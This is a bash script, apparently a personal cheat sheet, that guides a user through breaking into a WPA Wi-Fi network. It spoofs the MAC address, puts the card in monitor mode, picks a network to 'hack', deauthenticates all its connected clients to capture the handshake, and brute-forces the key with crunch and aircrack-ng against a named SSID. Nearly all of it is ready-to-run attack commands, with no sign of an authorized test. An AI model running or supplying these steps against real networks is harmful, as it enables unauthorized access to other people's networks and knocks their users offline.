#!/bin/bash
#	put ur wlan0 to down									%001
#	change the mac which is assigned to wlan0				%002
#	put ur wlan0 to up										%003
#	make ur wlan0 that it can do injection					%004
#	check all wifi which u can hack							%005
#	copy the line which has the wifi00 which u will hack	%006
#	see who are client who are connected to wifi00			%007
#	deauth all users who are connected to wifi00			%008
#	do the #hacking											%009

#	%001
echo set ur wlan0 really down by:
echo '	ifconfig wlan0 down'
read
# ifconfig wlan0 down

#	%002
echo 'change the mac which is assigned to wlan0'
echo '	u will see the current mac and the fakedMac'
echo '	macchanger -m 00:11:22:33:44:55 wlan0'
read
# macchanger -m 00:11:22:33:44:55

#	%003
echo 'put ur wlan0 to up'
echo '	ifconfig wlan0 up'
read
# ifconfig wlan0 up

echo 'check that wlan0 is working'
echo '	iwconfig wlan0'
read
# iwconfig wlan0

#	%004
echo 'put ur wlan0 that it can do an injection'
echo 'it will create another interface mon0 which will do the injection'
echo 'so, from now, use mon0 which can do the injection'
echo '	airmon-ng start wlan0'
read
# airmon-ng start wlan0

echo 'check that mon0 is in monitor mode'
echo '	iwconfig mon0'
read
# iwconfig mon0

#	%005
echo 'check all wifi which u can hack'
echo '	airodump-ng mon0'
read
# airodump-ng mon0

#	%006
echo 'copy the line which has the wifi00 which u will hack'
echo 'which contains: bssid00 channel00 '
read

#	%007
echo 'see who are the client who connected to the wifi00 u just copied'
echo 'and let it running, do not close that window'
echo '	airodump-ng --bssid bssid00 -c channel00 -w nonSens00 mon0'
read
# airodump-ng --bssid bssid00 -c channel00 -w nonSens00 mon0

#	%008
echo 'deauth all users who are connected to wifi00'
echo '	aireplay-ng -0 30 -a bssid00 mon0'
read
# aireplay-ng -o 30 -a bssid00 mon0

echo 'go back in airodump-ng, u should see that there is handshake'
read

#	%009
echo 'crack the wifi using wordlist00.lst'
echo '	nonSense00 is a file which have been created just before'
# echo '	aircrack-ng -w wordlist00.lst -b bssid00 nonSens00*.cap '
echo '	crunch 10 10 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 | aircrack-ng -a 2 forCrunch-01.cap -e BM652w-DCn3tr -w -'
read
# aircrack-ng -w wordlist00.lst -b bssid00 nonSens00*.cap

echo 'normally u have it'
